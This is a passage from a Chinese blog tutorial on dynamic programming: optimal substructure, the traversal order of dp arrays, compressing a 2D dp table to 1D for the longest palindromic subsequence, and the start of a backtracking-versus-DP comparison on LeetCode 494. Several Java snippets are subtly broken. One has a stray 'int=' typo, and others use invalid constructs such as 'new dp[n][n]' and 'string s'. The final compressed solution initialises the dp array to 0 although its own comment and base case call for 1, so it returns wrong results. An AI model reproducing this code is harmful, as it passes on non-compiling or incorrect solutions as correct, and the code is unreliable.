个班的最大分数差不一定就包含全校学生的最大分数差，比如全校的最大分数差可能是 3 班的最高分和 6 班的最低分之差。</p><p>这次我给你提出的问题就<strong>不符合最优子结构</strong>，因为你没办通过每个班的最优值推出全校的最优值，没办法通过子问题的最优值推出规模更大的问题的最优值。前文 <a href="http://mp.weixin.qq.com/s?__biz=MzAxODQxMDM0Mw==&amp;mid=2247484731&amp;idx=1&amp;sn=f1db6dee2c8e70c42240aead9fd224e6&amp;chksm=9bd7fb33aca07225bee0b23a911c30295e0b90f393af75eca377caa4598ffb203549e1768336&amp;scene=21#wechat_redirect">动态规划详解</a> 说过，想满足最优子结，子问题之间必须互相独立。全校的最大分数差可能出现在两个班之间，显然子问题不独立，所以这个问题本身不符合最优子结构。</p><p><strong>那么遇到这种最优子结构失效情况，怎么办？策略是：改造问题</strong>。对于最大分数差这个问题，我们不是没办法利用已知的每个班的分数差吗，那我只能这样写一段暴力代码：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">int</span>= result = <span class="hljs-number">0</span>;<br><span class="hljs-keyword">for</span> (Student a : school) &#123;<br>  <span class="hljs-keyword">for</span> (Student b : school) &#123;<br><span class="hljs-keyword">if</span> (a is b) <span class="hljs-keyword">continue</span>;<br>result = max(result, |a.score - b.score|);<br>  &#125;<br>&#125;<br><span class="hljs-keyword">return</span> result;<br></code></pre></td></tr></table></figure><p>改造问题，也就是把问题等价转化：最大分数差，不就等价于最高分数和最低分数的差么，那不就是要求最高和最低分数么，不就是我们讨论的第一个问题么，不就具有最优子结构了么？那现在改变思路，借助最优子结构解决最值问题，再回过头解决最大分数差问题，是不是就高效多了？</p><p>当然，上面这个例子太简单了，不过请读者回顾一下，我们做动态规划问题，是不是一直在求各种最值，本质跟我们举的例子没啥区别，无非需要处理一下重叠子问题。</p><p>前文 <a href="http://mp.weixin.qq.com/s?__biz=MzAxODQxMDM0Mw==&amp;mid=2247484469&amp;idx=1&amp;sn=e8d321c8ad62483874a997e9dd72da8f&amp;chksm=9bd7fa3daca0732b316aa0afa58e70357e1cb7ab1fe0855d06bc4a852abb1b434c01c7dd19d6&amp;scene=21#wechat_redirect">动态规划：不同的定义产生不同的解法</a> 和 <a href="http://mp.weixin.qq.com/s?__biz=MzAxODQxMDM0Mw==&amp;mid=2247484690&amp;idx=1&amp;sn=eea075701a5d96dd5c6e3dc6a993cac5&amp;chksm=9bd7fb1aaca0720c58c9d9e02a8b9211a289bcea359633a95886d7808d2846898d489ce98078&amp;scene=21#wechat_redirect">经典动态规划：高楼扔鸡蛋（进阶篇）</a> 就展示了如何改造问题，不同的最优子结构，可能导致不同的解法和效率。</p><p>再举个常见但也十分简单的例子，求一棵二叉树的最大值，不难吧（简单起见，假设节点中的值都是非负数）：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">maxVal</span><span class="hljs-params">(TreeNode root)</span> </span>&#123;<br>  <span class="hljs-keyword">if</span> (root == <span class="hljs-keyword">null</span>)<br><span class="hljs-keyword">return</span> -<span class="hljs-number">1</span>;  <br>  <span class="hljs-keyword">int</span> left = maxVal(root.left);<br>  <span class="hljs-keyword">int</span> right = maxVal(root.right);<br>  <span class="hljs-keyword">return</span> max(root.val, left, right);<br>&#125;<br></code></pre></td></tr></table></figure><p>你看这个问题也符合最优子结构，以root为根的树的最大值，可以通过两边子树（子问题）的最大值推导出来，结合刚才学校和班级的例子，很容易理解吧。</p><p>当然这也不是动态规划问题，旨在说明，最优子结构并不是动态规划独有的一种性质，能求最值的问题大部分都具有这个性质；<strong>但反过来，最优子结构性质作为动态规划问题的必要条件，一定是让你求最值的</strong>，以后碰到那种恶心人的最值题，思路往动态规划想就对了，这就是套路。</p><p>动态规划不就是从最简单的 base case 往后推导吗，可以想象成一个链式反应，不断以小博大。但只有符合最优子结构的问题，才有发生这种链式反应的性质。</p><p>找最优子结构的过程，其实就是证明状态转移方程正确性的过程，方程符合最优子结构就可以写暴力解了，写出暴力解就可以看出有没有重叠子问题了，有则优化，无则 OK。这也是套路，经常刷题的朋友应该能体会。</p><p>这里就不举那些正宗动态规划的例子了，读者可以翻翻历史文章，看看状态转移是如何遵循最优子结构的，这个话题就聊到这，下面再来看另外个动态规划迷惑行为。</p><h2 id="2-2-dp-数组的遍历方向"><a href="#2-2-dp-数组的遍历方向" class="headerlink" title="2.2 dp 数组的遍历方向"></a>2.2 dp 数组的遍历方向</h2><p>我相信读者做动态规划问题时，肯定会对dp数组的遍历顺序有些头疼。我们拿二维dp数组来举例，</p><p>有时候我们是正向遍历：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">int</span>[][] dp = <span class="hljs-keyword">new</span> <span class="hljs-keyword">int</span>[m][n];<br><span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> i = <span class="hljs-number">0</span>; i &lt; m; i++)<br>  <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> j = <span class="hljs-number">0</span>; j &lt; n; j++)<br>  <span class="hljs-comment">// 计算 dp[i][j]</span><br></code></pre></td></tr></table></figure><p>有时候我们反向遍历：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> i = m - <span class="hljs-number">1</span>; i &gt;= <span class="hljs-number">0</span>; i--)<br>  <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> j = n - <span class="hljs-number">1</span>; j &gt;= <span class="hljs-number">0</span>; j--)<br><span class="hljs-comment">// 计算 dp[i][j]</span><br></code></pre></td></tr></table></figure><p>有时候可能会斜向遍历：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">// 斜着遍历数组</span><br><span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> l = <span class="hljs-number">2</span>; l &lt;= n; l++) &#123;<br>  <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> i = <span class="hljs-number">0</span>; i &lt;= n - l; i++) &#123;<br><span class="hljs-keyword">int</span> j = l + i - <span class="hljs-number">1</span>;<br><span class="hljs-comment">// 计算 dp[i][j]</span><br> &#125;<br>&#125; <br></code></pre></td></tr></table></figure><p>甚至更让人迷惑的是，有时候发现正向反向遍历都可以得到正确答案，比如我们在 <a href="http://mp.weixin.qq.com/s?__biz=MzAxODQxMDM0Mw==&amp;mid=2247484508&amp;idx=1&amp;sn=42cae6e7c5ccab1f156a83ea65b00b78&amp;chksm=9bd7fa54aca07342d12ae149dac3dfa76dc42bcdd55df2c71e78f92dedbbcbdb36dec56ac13b&amp;scene=21#wechat_redirect">团灭 LeetCode 股票买卖问题</a> 中有的地方就正反皆可。</p><p>那么，如果仔细观察的话可以发现其中的原因的。你只要把住两点就行了：</p><p><strong>1、遍历的过程中，所需的状态必须是已经计算出来的</strong>。</p><p><strong>2、遍历的终点必须是存储结果的那个位置</strong>。</p><p>下面来具体解释上面两个原则是什么意思。</p><p>比如编辑距离这个经典的问题，详解见前文 <a href="http://mp.weixin.qq.com/s?__biz=MzAxODQxMDM0Mw==&amp;mid=2247484484&amp;idx=1&amp;sn=74594297022c84952162a68b7f739133&amp;chksm=9bd7fa4caca0735a1364dd13901311ecd6ec4913c8db05a1ff6cae8f069627eebe8d651bbeb1&amp;scene=21#wechat_redirect">经典动态规划：编辑距离</a>，我们通过对dp数组的定义，确定了 base case 是$dp[..][0]$和$dp[0][..]$，最终答案是$dp[m][n]$；而且我们通过状态转移方程知道$dp[i][j]$需要从$dp[i-1][j],dp[i][j-1],dp[i-1][j-1]$转移而来，如下图：</p><p><img src="http://hexo-bolg-image.oss-cn-beijing.aliyuncs.com/img/640.jpeg" alt="640" style="zoom:50%;" /></p><p>那么，参考刚才说的两条原则，你该怎么遍历dp数组？肯定是正向遍历：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> i = <span class="hljs-number">1</span>; i &lt; m; i++)<br>  <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> j = <span class="hljs-number">1</span>; j &lt; n; j++)<br>    <span class="hljs-comment">// 通过 dp[i-1][j], dp[i][j - 1], dp[i-1][j-1]</span><br><span class="hljs-comment">// 计算 dp[i][j]</span><br></code></pre></td></tr></table></figure><p><strong>因为，这样每一步迭代的左边、上边、左上边的位置都是 base case 或者之前计算过的，而且最终结束在我们想要的答案</strong>$dp[m][n]$。</p><p>再举一例，回文子序列问题，详见前文 <a href="http://mp.weixin.qq.com/s?__biz=MzAxODQxMDM0Mw==&amp;mid=2247484666&amp;idx=1&amp;sn=e3305be9513eaa16f7f1568c0892a468&amp;chksm=9bd7faf2aca073e4f08332a706b7c10af877fee3993aac4dae86d05783d3d0df31844287104e&amp;scene=21#wechat_redirect">子序列解题模板：最长回文子序列</a>，我们通过对dp数组的定义，确定了 base case 处在中间的对角线，dp$[i][j]$需要从$dp[i+1][j],dp[i][j-1],dp[i+1][j-1]$转移而来，想要求的最终答案是$dp[0][n-1]$，如下图：</p><p><img src="http://hexo-bolg-image.oss-cn-beijing.aliyuncs.com/img/640.jpeg" alt="img" style="zoom:50%;" /></p><p>这种情况根据刚才的两个原则，就可以有两种正确的遍历方式：</p><p><img src="http://hexo-bolg-image.oss-cn-beijing.aliyuncs.com/img/640.jpeg" alt="img" style="zoom:50%;" /></p><p><strong>要么从左至右斜着遍历，要么从下向上从左到右遍历，这样才能保证每次</strong>$dp[i][j]$的左边、下边、左下边已经计算完毕，最终得到正确结果。</p><p>现在，你应该理解了这两个原则，主要就是看 base case 和最终结果的存储位置，保证遍历过程中使用的数据都是计算完毕的就行，有时候确实存在多种方法可以得到正确答案，可根据个人口味自行选择。</p><h1 id="3-状态压缩"><a href="#3-状态压缩" class="headerlink" title="3. 状态压缩"></a>3. 状态压缩</h1><p>动态规划本身也是可以进行阶段性优化的，比如说我们常听说的「状态压缩」技巧，就能够把很多动态规划解法的空间复杂度进一步降低，由 O(N^2) 降低到 O(N)，</p><p>能够使用状态压缩技巧的动态规划都是二维 <code>dp</code> 问题，<strong>你看它的状态转移方程，如果计算状态</strong> <strong><code>dp[i][j]</code></strong> <strong>需要的都是</strong> <strong><code>dp[i][j]</code></strong> <strong>相邻的状态，那么就可以使用状态压缩技巧</strong>，将二维的 <code>dp</code> 数组转化成一维，将空间复杂度从 O(N^2) 降低到 O(N)。</p><p>什么叫「和 <code>dp[i][j]</code> 相邻的状态」呢，比如前文 <a href="">最长回文子序列</a> 中，最终的代码如下：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">longestPalindromeSubseq</span><span class="hljs-params">(string s)</span> </span>&#123;<br>    <span class="hljs-keyword">int</span> n = s.size();<br>    <span class="hljs-comment">// dp 数组全部初始化为 0</span><br>    <span class="hljs-keyword">int</span>[][] dp = <span class="hljs-keyword">new</span> dp[n][n];<br>    Arrays.fill(dp,<span class="hljs-number">0</span>);<br>    <span class="hljs-comment">// base case</span><br>    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> i = <span class="hljs-number">0</span>; i &lt; n; i++)<br>        dp[i][i] = <span class="hljs-number">1</span>;<br>    <span class="hljs-comment">// 反着遍历保证正确的状态转移</span><br>    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> i = n - <span class="hljs-number">2</span>; i &gt;= <span class="hljs-number">0</span>; i--) &#123;<br>        <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> j = i + <span class="hljs-number">1</span>; j &lt; n; j++) &#123;<br>            <span class="hljs-comment">// 状态转移方程</span><br>            <span class="hljs-keyword">if</span> (s[i] == s[j])<br>                dp[i][j] = dp[i + <span class="hljs-number">1</span>][j - <span class="hljs-number">1</span>] + <span class="hljs-number">2</span>;<br>            <span class="hljs-keyword">else</span><br>                dp[i][j] = Math.max(dp[i + <span class="hljs-number">1</span>][j], dp[i][j - <span class="hljs-number">1</span>]);<br>        &#125;<br>    &#125;<br>    <span class="hljs-comment">// 整个 s 的最长回文子串长度</span><br>    <span class="hljs-keyword">return</span> dp[<span class="hljs-number">0</span>][n - <span class="hljs-number">1</span>];<br>&#125;<br></code></pre></td></tr></table></figure><p>PS：我们本文不探讨如何推状态转移方程，只探讨对二维 DP 问题进行状态压缩的技巧。技巧都是通用的，所以如果你没看过前文，不明白这段代码的逻辑也无妨，完全不会阻碍你学会状态压缩。</p><p>你看我们对 <code>dp[i][j]</code> 的更新，其实只依赖于 <code>dp[i+1][j-1], dp[i][j-1], dp[i+1][j]</code> 这三个状态：</p><p><img src="http://hexo-bolg-image.oss-cn-beijing.aliyuncs.com/img/5" alt="img" style="zoom:50%;" /></p><p>这就叫和 <code>dp[i][j]</code> 相邻，反正你计算 <code>dp[i][j]</code> 只需要这三个相邻状态，其实根本不需要那么大一个二维的 dp table 对不对？<strong>状态压缩的核心思路就是，将二维数组「投影」到一维数组</strong>：</p><p><img src="http://hexo-bolg-image.oss-cn-beijing.aliyuncs.com/img/4" alt="img" style="zoom:50%;" /></p><p>思路很直观，但是也有一个明显的问题，图中 <code>dp[i][j-1]</code> 和 <code>dp[i+1][j-1]</code> 这两个状态处在同一列，而一维数组中只能容下一个，那么当我计算 <code>dp[i][j]</code> 时，他俩必然有一个会被另一个覆盖掉，怎么办？</p><p>这就是状态压缩的难点，下面就来分析解决这个问题，还是拿「最长回文子序列」问题距离，它的状态转移方程主要逻辑就是如下这段代码：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> i = n - <span class="hljs-number">2</span>; i &gt;= <span class="hljs-number">0</span>; i--) &#123;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> j = i + <span class="hljs-number">1</span>; j &lt; n; j++) &#123;<br>        <span class="hljs-comment">// 状态转移方程</span><br>        <span class="hljs-keyword">if</span> (s[i] == s[j])<br>            dp[i][j] = dp[i + <span class="hljs-number">1</span>][j - <span class="hljs-number">1</span>] + <span class="hljs-number">2</span>;<br>        <span class="hljs-keyword">else</span><br>            dp[i][j] = max(dp[i + <span class="hljs-number">1</span>][j], dp[i][j - <span class="hljs-number">1</span>]);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>想把二维 <code>dp</code> 数组压缩成一维，一般来说是把第一个维度，也就是 <code>i</code> 这个维度去掉，只剩下 <code>j</code> 这个维度。<strong>压缩后的一维</strong> <strong><code>dp</code></strong> <strong>数组就是之前二维</strong> <strong><code>dp</code></strong> <strong>数组的</strong> <strong><code>dp[i][..]</code></strong> <strong>那一行</strong>。</p><p>我们先将上述代码进行改造，直接无脑去掉 <code>i</code> 这个维度，把 <code>dp</code> 数组变成一维：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> i = n - <span class="hljs-number">2</span>; i &gt;= <span class="hljs-number">0</span>; i--) &#123;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> j = i + <span class="hljs-number">1</span>; j &lt; n; j++) &#123;<br>        <span class="hljs-comment">// 在这里，一维 dp 数组中的数是什么？</span><br>        <span class="hljs-keyword">if</span> (s[i] == s[j])<br>            dp[j] = dp[j - <span class="hljs-number">1</span>] + <span class="hljs-number">2</span>;<br>        <span class="hljs-keyword">else</span><br>            dp[j] = Math.max(dp[j], dp[j - <span class="hljs-number">1</span>]);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>上述代码的一维 <code>dp</code> 数组只能表示二维 <code>dp</code> 数组的一行 <code>dp[i][..]</code>，那我怎么才能得到 <code>dp[i+1][j-1], dp[i][j-1], dp[i+1][j]</code> 这几个必要的的值，进行状态转移呢？</p><p>在代码中注释的位置，将要进行状态转移，更新 <code>dp[j]</code>，那么我们要来思考两个问题：</p><p>1、在对 <code>dp[j]</code> 赋新值之前，<code>dp[j]</code> 对应着二维 <code>dp</code> 数组中的什么位置？</p><p>2、<code>dp[j-1]</code> 对应着二维 <code>dp</code> 数组中的什么位置？</p><p><strong>对于问题 1，在对</strong> <strong><code>dp[j]</code></strong> <strong>赋新值之前，</strong><code>dp[j]</code> <strong>的值就是外层 for 循环上一次迭代算出来的值，也就是对应二维</strong> <strong><code>dp</code></strong> <strong>数组中</strong> <strong><code>dp[i+1][j]</code></strong> <strong>的位置</strong>。</p><p><strong>对于问题 2，</strong><code>dp[j-1]</code> <strong>的值就是内层 for 循环上一次迭代算出来的值，也就是对应二维</strong> <strong><code>dp</code></strong> <strong>数组中</strong> <strong><code>dp[i][j-1]</code></strong> <strong>的位置</strong>。</p><p>那么问题已经解决了一大半了，只剩下二维 <code>dp</code> 数组中的 <code>dp[i+1][j-1]</code> 这个状态我们不能直接从一维 <code>dp</code> 数组中得到：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> i = n - <span class="hljs-number">2</span>; i &gt;= <span class="hljs-number">0</span>; i--) &#123;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> j = i + <span class="hljs-number">1</span>; j &lt; n; j++) &#123;<br>        <span class="hljs-keyword">if</span> (s[i] == s[j])<br>            <span class="hljs-comment">// dp[i][j] = dp[i+1][j-1] + 2;</span><br>            dp[j] = ?? + <span class="hljs-number">2</span>;<br>        <span class="hljs-keyword">else</span><br>            <span class="hljs-comment">// dp[i][j] = max(dp[i+1][j], dp[i][j-1]);</span><br>            dp[j] = max(dp[j], dp[j - <span class="hljs-number">1</span>]);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>因为 for 循环遍历 <code>i</code> 和 <code>j</code> 的顺序为从左向右，从下向上，所以可以发现，在更新一维 <code>dp</code> 数组的时候，<code>dp[i+1][j-1]</code> 会被 <code>dp[i][j-1]</code> 覆盖掉，图中标出了这四个位置被遍历到的次序：</p><p><img src="http://hexo-bolg-image.oss-cn-beijing.aliyuncs.com/img/3" alt="img" style="zoom:50%;" /></p><p><strong>那么如果我们想得到</strong> <strong><code>dp[i+1][j-1]</code></strong>，就必须在它被覆盖之前用一个临时变量 <strong><code>temp</code></strong> <strong>把它存起来，并把这个变量的值保留到计算</strong> <strong><code>dp[i][j]</code></strong> <strong>的时候</strong>。为了达到这个目的，结合上图，我们可以这样写代码：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> i = n - <span class="hljs-number">2</span>; i &gt;= <span class="hljs-number">0</span>; i--) &#123;<br>    <span class="hljs-comment">// 存储 dp[i+1][j-1] 的变量</span><br>    <span class="hljs-keyword">int</span> pre = <span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> j = i + <span class="hljs-number">1</span>; j &lt; n; j++) &#123;<br>        <span class="hljs-keyword">int</span> temp = dp[j];<br>        <span class="hljs-keyword">if</span> (s[i] == s[j])<br>            <span class="hljs-comment">// dp[i][j] = dp[i+1][j-1] + 2;</span><br>            dp[j] = pre + <span class="hljs-number">2</span>;<br>        <span class="hljs-keyword">else</span><br>            dp[j] = Math.max(dp[j], dp[j - <span class="hljs-number">1</span>]);<br>        <span class="hljs-comment">// 到下一轮循环，pre 就是 dp[i+1][j-1] 了</span><br>        pre = temp;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>别小看这段代码，这是一维 <code>dp</code> 最精妙的地方，会者不难，难者不会。为了清晰起见，我用具体的数值来拆解这个逻辑：</p><p>假设现在 <code>i = 5, j = 7</code> 且 <code>s[5] == s[7]</code>，那么现在会进入下面这个逻辑对吧：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">if</span> (s[<span class="hljs-number">5</span>] == s[<span class="hljs-number">7</span>])<br>    <span class="hljs-comment">// dp[5][7] = dp[i+1][j-1] + 2;</span><br>    dp[<span class="hljs-number">7</span>] = pre + <span class="hljs-number">2</span>;<br></code></pre></td></tr></table></figure><p>我问你这个 <code>pre</code> 变量是什么？是内层 for 循环上一次迭代的 <code>temp</code> 值。</p><p>那我再问你内层 for 循环上一次迭代的 <code>temp</code> 值是什么？是 <code>dp[j-1]</code> 也就是 <code>dp[6]</code>，但这是外层 for 循环上一次迭代对应的 <code>dp[6]</code>，也就是二维 <code>dp</code> 数组中的 <code>dp[i+1][6] = dp[6][6]</code>。</p><p>也就是说，<code>pre</code> 变量就是 <code>dp[i+1][j-1] = dp[6][6]</code>，也就是我们想要的结果。</p><p>那么现在我们成功对状态转移方程进行了降维打击，算是最硬的的骨头啃掉了，但注意到我们还有 base case 要处理呀：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">// dp 数组全部初始化为 0</span><br><span class="hljs-keyword">int</span>[][] dp = <span class="hljs-keyword">new</span> dp[n][n];<br>Arrays.fill(dp,<span class="hljs-number">0</span>);<br><span class="hljs-comment">// base case</span><br><span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> i = <span class="hljs-number">0</span>; i &lt; n; i++)<br>    dp[i][i] = <span class="hljs-number">1</span>;<br></code></pre></td></tr></table></figure><p>如何把 base case 也打成一维呢？很简单，记住状态压缩就是投影，我们把 base case 投影到一维看看：</p><p><img src="http://hexo-bolg-image.oss-cn-beijing.aliyuncs.com/img/2" alt="img" style="zoom:50%;" /></p><p>二维 <code>dp</code> 数组中的 base case 全都落入了一维 <code>dp</code> 数组，不存在冲突和覆盖，所以说我们直接这样写代码就行了：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">// 一维 dp 数组全部初始化为 1</span><br><span class="hljs-keyword">int</span>[] dp = <span class="hljs-keyword">new</span> dp[n];<br>Arrays.fill(dp,<span class="hljs-number">0</span>);<br></code></pre></td></tr></table></figure><p>至此，我们把 base case 和状态转移方程都进行了降维，实际上已经写出完整代码了：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">longestPalindromeSubseq</span><span class="hljs-params">(string s)</span> </span>&#123;<br>    <span class="hljs-keyword">int</span> n = s.size();<br>    <span class="hljs-comment">// base case：一维 dp 数组全部初始化为 0</span><br>    <span class="hljs-keyword">int</span>[] dp = <span class="hljs-keyword">new</span> dp[n];<br>Arrays.fill(dp,<span class="hljs-number">0</span>);<br>    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> i = n - <span class="hljs-number">2</span>; i &gt;= <span class="hljs-number">0</span>; i--) &#123;<br>        <span class="hljs-keyword">int</span> pre = <span class="hljs-number">0</span>;<br>        <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> j = i + <span class="hljs-number">1</span>; j &lt; n; j++) &#123;<br>            <span class="hljs-keyword">int</span> temp = dp[j];<br>            <span class="hljs-comment">// 状态转移方程</span><br>            <span class="hljs-keyword">if</span> (s[i] == s[j])<br>                dp[j] = pre + <span class="hljs-number">2</span>;<br>            <span class="hljs-keyword">else</span><br>                dp[j] = Math.max(dp[j], dp[j - <span class="hljs-number">1</span>]);<br>            pre = temp;<br>        &#125;<br>    &#125;<br>    <span class="hljs-keyword">return</span> dp[n - <span class="hljs-number">1</span>];<br>&#125;<br></code></pre></td></tr></table></figure><p>本文就结束了，不过状态压缩技巧再牛逼，也是基于常规动态规划思路之上的。</p><p>你也看到了，使用状态压缩技巧对二维 <code>dp</code> 数组进行降维打击之后，解法代码的可读性变得非常差了，如果直接看这种解法，任何人都是一脸懵逼的。算法的优化就是这么一个过程，先写出可读性很好的暴力递归算法，然后尝试运用动态规划技巧优化重叠子问题，最后尝试用状态压缩技巧优化空间复杂度。</p><p>也就是说，你最起码能够熟练运用我们前文 <a href="">动态规划框架套路详解</a> 的套路找出状态转移方程，写出一个正确的动态规划解法，然后才有可能观察状态转移的情况，分析是否可能使用状态压缩技巧来优化。</p><h1 id="4-动态规划和回溯算法"><a href="#4-动态规划和回溯算法" class="headerlink" title="4. 动态规划和回溯算法"></a>4. 动态规划和回溯算法</h1><p>回溯算法和递归算法有点类似，有的问题如果实在想不出状态转移方程，尝试用回溯算法暴力解决也是一个聪明的策略，总比写不出来解法强。</p><p>那么，回溯算法和动态规划到底是啥关系？它俩都涉及递归，算法模板看起来还挺像的，都涉及做「选择」，真的酷似父与子。</p><p>那么，它俩具体有啥区别呢？回溯算法和动态规划之间，是否可能互相转化呢？</p><p>今天就用力扣第 494 题「目标和」来详细对比一下回溯算法和动态规划，真可谓群魔乱舞：</p><p><img src="http://hexo-bolg-image.oss-cn-beijing.aliyuncs.com/img/目标和" alt="img" style="zoom:33%;" /></p><p>注意，给出的例子 <code>nums</code> 全是 1，但实际上可以是任意正整数哦。</p><h2 id="4-1-回溯思路"><a href="#4-1-回溯思路" class="headerlink" title="4.1 回溯思路"></a>4.1 回溯思路</h2><p>其实我第一眼看到这个题目，花了两分钟就写出了一个回溯解法。</p><p>任何算法的核心都是穷举，回溯算法就是一个暴力穷举算法，前文 <a href="">回溯算法解题框架</a> 就写了回溯算法框架：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title">backtrack</span><span class="hljs-params">(路径, 选择列表)</span></span>&#123;<br>    <span class="hljs-keyword">if</span>(满足结束条件)&#123;<br>        result.add(路径);<br>        <span class="hljs-keyword">return</span>;<br>&#125;<br>    <span class="hljs-keyword">for</span>(选择列表:选择)&#123;<br>        <span class="hljs-comment">//做选择</span><br>        backtrack(路径, 选择列表);<br>        <span class="hljs-comment">//撤销选择</span><br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>关键就是搞清楚什么是「选择」，而对于这道题，「选择」不是明摆着的吗？<strong>对于每个数字</strong> <strong><code>nums[i]</code></strong>，我们可以选择给一个正号 <strong><code>+</code></strong> <strong>或者一个负号</strong> <strong><code>-</code></strong>，然后利用回溯模板穷举出来所有可能的结果，数一数到底有几种组合能够凑出 